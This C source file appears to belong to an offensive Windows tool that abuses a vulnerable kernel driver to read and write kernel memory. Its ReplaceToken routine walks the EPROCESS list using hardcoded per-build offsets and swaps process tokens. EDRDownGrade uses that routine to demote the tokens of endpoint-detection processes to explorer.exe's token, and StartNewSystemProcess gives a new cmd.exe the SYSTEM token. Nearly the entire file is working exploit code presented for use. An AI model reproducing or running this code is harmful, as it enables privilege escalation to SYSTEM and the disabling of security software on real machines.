#include "common.h"

#include <psapi.h> // Required for EnumDrivers

void PrintOffsets() {
    info_t("EPROCESS Offsets:");
    info_t("\tdwUniqueProcessId: \t\t0x%llx", g_Offsets.UniqueProcessIdOffset);
    info_t("\tActiveProcessLinks: \t\t0x%llx", g_Offsets.ActiveProcessLinksOffset);
    info_t("\tToken: \t\t\t\t0x%llx", g_Offsets.TokenOffset);
}

BOOL GetOffsets() {

    BOOL	bSTATE = TRUE;
    HMODULE	hNTDLL = NULL;      // Stores handle to ntdll.dll

    // Declare the RTL_OSVERSIONINFOW structure
    RTL_OSVERSIONINFOW versionInfo = { 0 };
    versionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);

    // Get handle to ntdll.dll
    // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
    hNTDLL = LoadLibraryA("ntdll.dll");
    if (!hNTDLL) {
        errorWin32("LoadLibraryA - Failed to get handle to ntdll.dll");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("LoadLibraryA - Received handle to ntdll.dll 0x%p", hNTDLL);

    // Resolve address of RtlGetVersion
    fnRtlGetVersion pRtlGetVersion = (fnRtlGetVersion)GetProcAddress(hNTDLL, "RtlGetVersion");
    if (!pRtlGetVersion) {
        errorWin32("GetProcAddress - Failed to address of RtlGetVersion");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("GetProcAddress - Received address to RtlGetVersion 0x%p", pRtlGetVersion);

    // Call RtlGetVersion to get the Windows version
    if (pRtlGetVersion(&versionInfo) == 0) {
        info_t("Windows Version: %lu.%lu (Build: %lu)\n", versionInfo.dwMajorVersion, versionInfo.dwMinorVersion, versionInfo.dwBuildNumber);
    }
    else {
        error("Failed to get Windows version.\n");
        return FALSE;
    }

    // Get the offsets for UniqueProcessIdOffset and ActiveProcessLinksOffset
    if (versionInfo.dwBuildNumber == 3790) {
        g_Offsets.UniqueProcessIdOffset = 0xd8;
        g_Offsets.ActiveProcessLinksOffset = 0xe0;
        g_Offsets.TokenOffset = 0x160;
    }
    else if (versionInfo.dwBuildNumber == 6000 || versionInfo.dwBuildNumber == 6001 || versionInfo.dwBuildNumber == 6002) {
        g_Offsets.UniqueProcessIdOffset = 0xe0;
        g_Offsets.ActiveProcessLinksOffset = 0xe8;
        g_Offsets.TokenOffset = 0x168;
    }
    else if (versionInfo.dwBuildNumber == 7600 || versionInfo.dwBuildNumber == 7601) {
        g_Offsets.UniqueProcessIdOffset = 0x180;
        g_Offsets.ActiveProcessLinksOffset = 0x188;
        g_Offsets.TokenOffset = 0x208;
    }
    else if (versionInfo.dwBuildNumber == 9200) {
        g_Offsets.UniqueProcessIdOffset = 0x2e0;
        g_Offsets.ActiveProcessLinksOffset = 0x2e8;
        g_Offsets.TokenOffset = 0x348;
    }
    else if (versionInfo.dwBuildNumber >= 9200 && versionInfo.dwBuildNumber <= 9600) {
        g_Offsets.UniqueProcessIdOffset = 0x2e0;
        g_Offsets.ActiveProcessLinksOffset = 0x2e8;
        g_Offsets.TokenOffset = 0x348;
    }
    else if (versionInfo.dwBuildNumber >= 10240 && versionInfo.dwBuildNumber <= 14393) {
        g_Offsets.UniqueProcessIdOffset = 0x2e8;
        g_Offsets.ActiveProcessLinksOffset = 0x2f0;
        g_Offsets.TokenOffset = 0x358;
    }
    else if (versionInfo.dwBuildNumber >= 15063 && versionInfo.dwBuildNumber <= 17763) {
        g_Offsets.UniqueProcessIdOffset = 0x2e0;
        g_Offsets.ActiveProcessLinksOffset = 0x2e8;
        g_Offsets.TokenOffset = 0x358;
    }
    else if (versionInfo.dwBuildNumber == 18362) {
        g_Offsets.UniqueProcessIdOffset = 0x2e8;
        g_Offsets.ActiveProcessLinksOffset = 0x2f0;
        g_Offsets.TokenOffset = 0x360;
    }
    else if (versionInfo.dwBuildNumber >= 19041 && versionInfo.dwBuildNumber <= 22631) {
        g_Offsets.UniqueProcessIdOffset = 0x440;
        g_Offsets.ActiveProcessLinksOffset = 0x448;
        g_Offsets.TokenOffset = 0x4b8;
    }
    else if (versionInfo.dwBuildNumber >= 26100) {
        g_Offsets.UniqueProcessIdOffset = 0x1d0;
        g_Offsets.ActiveProcessLinksOffset = 0x1d8;
        g_Offsets.TokenOffset = 0x248;
    }
    else {
        g_Offsets.UniqueProcessIdOffset = 0x0;
        g_Offsets.ActiveProcessLinksOffset = 0x0;
        return FALSE;
    }

_cleanUp:

    // Cleanup close handle
    if (hNTDLL) {
        FreeLibrary(hNTDLL);
    }

    return bSTATE;

}

DWORD64 GetKernelBaseAddr() {
    
    DWORD dwCB = 0;
    DWORD64 dwDrivers[1024];

    // Retrieve the load address for each device driver in the system
    // https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers
    if (EnumDeviceDrivers(dwDrivers, sizeof(dwDrivers), &dwCB)) {
        
        // Return the first address in the list, which should be the address of Ntoskrnl
        return (DWORD64)dwDrivers[0];
    }
    return NULL;
}

DWORD64 ResolvePsInitialSystemProcessOffset() {

    HMODULE     hNtoskrnl                       = NULL; // Stores handle to ntoskrnl.exe
    DWORD64     PsInitialSystemProcessOffset    = NULL; // Stores the PsInitialSystemProcessOffset offset

    // Get handle to ntoskrnl.exe
    // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
    hNtoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (!hNtoskrnl) {
        errorWin32("LoadLibraryA - Failed to get handle to ntoskrnl.exe");
        return NULL;
    }
    info_t("LoadLibraryA - Received handle to ntoskrnl.exe 0x%p", hNtoskrnl);

    // Resolve offset of PsInitialSystemProcessOffset
    PsInitialSystemProcessOffset = (DWORD64)GetProcAddress(hNtoskrnl, "PsInitialSystemProcess") - (DWORD64)hNtoskrnl;
    if (!PsInitialSystemProcessOffset) {
        errorWin32("GetProcAddress - Failed to resolv PsInitialSystemProcess offset");
        if (hNtoskrnl) {
            FreeLibrary(hNtoskrnl);
        }
        return NULL;
    }

    // Cleanup free library
    if (hNtoskrnl) {
        FreeLibrary(hNtoskrnl);
    }

    return PsInitialSystemProcessOffset;

}

// Replace the token of target process with the one from source process
BOOL ReplaceToken(IN DWORD64 dwTargetPID, IN DWORD64 dwSourcePID) {

    BOOL        bSTATE                                  = TRUE;
    HANDLE		hDevice                                 = NULL; // Stores handle to the device driver
    DWORD64     dwKernelBase                            = NULL; // Stores kernel base address
    DWORD64     PsInitialSystemProcessOffset            = NULL; // Stores the PsInitialSystemProcess offset
    DWORD64     PsInitialSystemProcessAddress           = NULL; // Stores the address to PsInitialSystemProcess
    DWORD64     dwTargetProcessAddress                  = NULL; // Stores the target process address where the stolen token will be overwritten
    DWORD64     dwSourceProcessAddress                  = NULL; // Stores the source process address which token will be stolen
    DWORD64     dwListHead                              = NULL; // Stores the first node in the kernel process list
    DWORD64     dwCurrentListEntry                      = NULL; // Stores the current list entry currently enumerating
    DWORD64     dwProcessEntry                          = NULL; // Stores the start of the current process _EPROCESS
    DWORD64     dwUniqueProcessId                       = NULL; // Stores the current PID currently enumerating
    DWORD64     dwTargetProcessFastToken                = NULL; // Stores the token from EPROCESS
    DWORD64     dwSourceProcessFastToken                = NULL; // Stores the token from EPROCESS
    DWORD64     dwTargetProcessTokenReferenceCounter    = NULL; // Stores the reference counter of the token
    DWORD64     dwSourceProcessTokenReferenceCounter    = NULL; // Stores the reference counter of the token
    DWORD64     dwTargetProcessToken                    = NULL; // Stores the token pointer
    DWORD64     dwSourceProcessToken                    = NULL; // Stores the token pointer

    // Open a handle to the vulnerable driver using symbolik link
    hDevice = GetDeviceHandle(g_VULNDRIVERSYMLINK);
    if (hDevice == NULL) {
        error("GetDeviceHandle - Failed");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("GetDeviceHandle - Handle to vulnerable driver 0x%p", hDevice);
    
    // Get Ntoskrnl base address
    dwKernelBase = GetKernelBaseAddr();
    if (dwKernelBase == NULL) {
        error("GetKernelBaseAddr - Failed to get Ntoskrnl address");
        return NULL;
    }
    info_t("GetKernelBaseAddr - Ntoskrnl base address: 0x%p", dwKernelBase)

    // Resolve offset of PsInitialSystemProcessOffset
    PsInitialSystemProcessOffset = ResolvePsInitialSystemProcessOffset();
    if (!PsInitialSystemProcessOffset) {
        errorWin32("ResolvePsInitialSystemProcessOffset - Failed to resolv PsInitialSystemProcess offset");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("ResolvePsInitialSystemProcessOffset - PsInitialSystemProcess offset", PsInitialSystemProcessOffset);

    // Resolve the address of PsInitialSystemProcess in kernel memory
    PsInitialSystemProcessAddress = ReadMemoryDWORD64(hDevice, dwKernelBase + PsInitialSystemProcessOffset);
    if (!PsInitialSystemProcessAddress) {
        error("ReadMemoryDWORD64 - failed");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("ReadMemoryDWORD64 - PsInitialSystemProcessAddress: 0x%p", PsInitialSystemProcessAddress);

    // Get the address of the first node in the list
    dwListHead = PsInitialSystemProcessAddress + g_Offsets.ActiveProcessLinksOffset;

    // Start from the beginning of the list
    dwCurrentListEntry = dwListHead;

    // Enumerate TargetProcessAddress and SourceProcessAddress
    do
    {
        // Subtract the offset to get the start of the current process _EPROCESS
        dwProcessEntry = dwCurrentListEntry - g_Offsets.ActiveProcessLinksOffset;

        // Read PID of the process in the _EPROCESS struct
        dwUniqueProcessId = ReadMemoryDWORD64(hDevice, dwProcessEntry + g_Offsets.UniqueProcessIdOffset);

        // Check if the PID equals our target pid
        if (dwUniqueProcessId == dwTargetPID && dwTargetProcessAddress == 0)
        {
            dwTargetProcessAddress = dwProcessEntry;
        }
        else if (dwUniqueProcessId == dwSourcePID && dwSourceProcessAddress == 0)
        {
            dwSourceProcessAddress = dwProcessEntry;
        }

        // Exit early if both addresses are found
        if (dwTargetProcessAddress && dwSourceProcessAddress) {
            break;
        }

        // Follow the Flink pointer to the next process in the list
        dwCurrentListEntry = ReadMemoryDWORD64(hDevice, dwProcessEntry + g_Offsets.ActiveProcessLinksOffset);
    } while (dwCurrentListEntry != dwListHead);

    if (!dwTargetProcessAddress) {
        error("ReadMemoryDWORD64 - Failed to resolve target process address");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("ReadMemoryDWORD64 - Target process address: 0x%p", dwTargetProcessAddress);
    info_t("ReadMemoryDWORD64 - Source process address: 0x%p", dwSourceProcessAddress);

    // Read the target and source process token from its EPROCESS
    dwTargetProcessFastToken = ReadMemoryDWORD64(hDevice, dwTargetProcessAddress + g_Offsets.TokenOffset);
    dwSourceProcessFastToken = ReadMemoryDWORD64(hDevice, dwSourceProcessAddress + g_Offsets.TokenOffset);

    // Extract the reference counter (lower 4 bits) from the EX_FAST_REF struct
    dwTargetProcessTokenReferenceCounter = dwTargetProcessFastToken & 15;
    dwSourceProcessTokenReferenceCounter = dwSourceProcessFastToken & 15;

    // Extract the token pointer by clearing the lower 4 bits (reference counter)
    dwTargetProcessToken = dwTargetProcessFastToken & ~15;
    dwSourceProcessToken = dwSourceProcessFastToken & ~15;

    // Check if we got everything
    if (!dwTargetProcessToken || !dwSourceProcessToken) {
        error("[-] Failed to resolve target or source process token");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("ReadMemoryDWORD64 - Target proccess token memory location 0x%p", dwTargetProcessToken);
    info_t("ReadMemoryDWORD64 - Source proccess token memory location 0x%p", dwSourceProcessToken);
    
    // Change the process token
    info_t("WriteMemoryDWORD64 - Changing token of PID %d to token of PID %d", dwTargetPID, dwSourcePID);
    WriteMemoryDWORD64(hDevice, dwTargetProcessAddress + g_Offsets.TokenOffset, dwTargetProcessTokenReferenceCounter | dwSourceProcessToken);

_cleanUp:

    // Close handle to device
    if (hDevice) {
        CloseHandle(hDevice);
    }

    return bSTATE;

}

// Downgrade token of all EDR process with token of source process
BOOL EDRDownGrade(IN DWORD dwSourcePID) {

    BOOL            bSTATE          = TRUE;
    DWORD           dwTargetPID     = NULL;
    PPROCESS_ENTRY  pProcList       = NULL; // Stores pointer to the custom process list struct
    DWORD           dwProcCount     = 0;    // Stores the amount of processes
    HANDLE          hProcessHeap    = NULL; // Handle to memory heap

    // Get handle to process heap
    hProcessHeap = GetProcessHeap();

    // Get the source of token to be cloned
    if (dwSourcePID == NULL) {
        info("EDRDownGrade - No source process provided, using \"explorer.exe\"");
        if (!GetRemoteProcessPID(L"explorer.exe", &dwSourcePID)) {
            error("GetRemoteProcessPID - Failed to get PID of \"explorer.exe\", exiting, please provide a custom source process with --sp");
            BOOL bSTATE = FALSE;
            goto _cleanUp;
        }
        okay("GetRemoteProcessPID - Process \"explorer.exe\" with PID %d found", dwSourcePID);
    }

    // Enumerate all the EDR processes
    if (!EnumerateEDRProcessesPID(&pProcList, &dwProcCount)) {
        error("EnumerateEDRProcessesPID - Failed to enumerate running processes");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("EnumerateEDRProcessesPID - %i EDR processes enumerated", dwProcCount);

    // Print EDR Process info
    for (DWORD i = 0; i < dwProcCount; i++) {
        infoW_t("\tMatched EDR process: \"%ls\" with PID %d", pProcList[i].pwszName, pProcList[i].dwPid);
    }

    // Loop over all the EDR processes
    for (DWORD i = 0; i < dwProcCount; i++) {
        // Replace token of EDR process with explorer process
        infoW("ReplaceToken - Replacing token of \"%ls\" with token of source process PID %d", pProcList[i].pwszName, dwSourcePID);
        if (!ReplaceToken(pProcList[i].dwPid, dwSourcePID)) {
            error("ReplaceToken - Failed to downgrade token");
            BOOL bSTATE = FALSE;
            goto _cleanUp;
        }
        okayW("ReplaceToken - Replaced token of \"%ls\" PID %d with token of source process PID %d", pProcList[i].pwszName, pProcList[i].dwPid, dwSourcePID);
        printf("\n");
    }

_cleanUp:

    // Free the EDR process list entries
    if (pProcList) {
        for (DWORD i = 0; i < dwProcCount; i++) {
            if (pProcList[i].pwszName) {
                HeapFree(hProcessHeap, 0, pProcList[i].pwszName); // Free process name
                pProcList[i].pwszName = NULL;
            }
        }
        HeapFree(hProcessHeap, 0, pProcList); // Free the process list itself
        pProcList = NULL;
    }

    return bSTATE;

}

// Start new cmd and steal the token of system placing it here
BOOL StartNewSystemProcess() {

    BOOL                bSTATE          = TRUE;
    STARTUPINFO         si              = { 0 }; // Stores startup info
    PROCESS_INFORMATION pi              = { 0 }; // Stores process info
    WCHAR               szCmdLine[]     = L"C:\\Windows\\System32\\cmd.exe"; // CMD path

    // Zero memory
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));        

    // Create new cmd.exe process
    if (!CreateProcessW(
        NULL,                                   // Application name (NULL to use command line string)
        szCmdLine,                              // Command line string
        NULL,                                   // Process security attributes
        NULL,                                   // Thread security attributes
        FALSE,                                  // Inherit handles
        CREATE_NEW_CONSOLE,                     // Creation flags
        NULL,                                   // Environment block
        NULL,                                   // Current directory
        &si,                                    // Pointer to STARTUPINFO structure
        &pi                                     // Pointer to PROCESS_INFORMATION structure
    )) {                    
        error("CreateProcessW - Failed to spawn process \"cmd.exe\"");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("CreateProcessW - Opened \"cmd.exe\" with PID %d", pi.dwProcessId);

    // Sleep for the process to spawn
    Sleep(2000);

    // Replace token of newly spawned cmd with system
    infoW("ReplaceToken - Replacing token of \"cmd.exe\" with token of system (PID 4)");
    if (!ReplaceToken(pi.dwProcessId, 4)) {
        error("ReplaceToken - Failed to downgrade token");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    okayW("ReplaceToken - Replaced token of \"cmd.exe\" with token of system");

_cleanUp:

    // Closing handles
    if (pi.hThread) {
        CloseHandle(pi.hThread);
    }
    if (pi.hProcess) {
        CloseHandle(pi.hProcess);
    }

    return bSTATE;

}